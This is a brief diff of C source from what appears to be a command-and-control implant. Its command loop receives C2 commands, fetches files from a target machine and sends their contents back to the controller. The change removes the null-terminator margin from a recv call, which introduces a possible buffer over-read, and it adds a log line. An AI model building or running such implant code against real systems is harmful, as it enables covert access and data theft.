@@ -66,14 +66,14 @@ int handleCommands(int* client_fd)
     
     while (!exit)
     {
-        char buffer [1024] = { 0 };
+        char buffer [1032] = { 0 };
         ssize_t valread = 0;
         Command* command = NULL;
 
         printf("Waiting for C2 command...\n\n");
 
         // Read our command
-        valread = recv(*client_fd, buffer, sizeof(buffer)-1, 0);
+        valread = recv(*client_fd, buffer, sizeof(buffer), 0);
         if (valread < 0)
         {
             printf("Failed read, error 0x%X (%s)\n", errno, strerror(errno));
@@ -128,6 +128,8 @@ int handleCommands(int* client_fd)
                 {
                     printf("Failed to get file from target\n");
                 }
+
+                printf("Sending %i bytes back to C2...\n", filesize);
 
                 // Send our response
                 if (!sendFileContents(client_fd, filesize, filebytes))
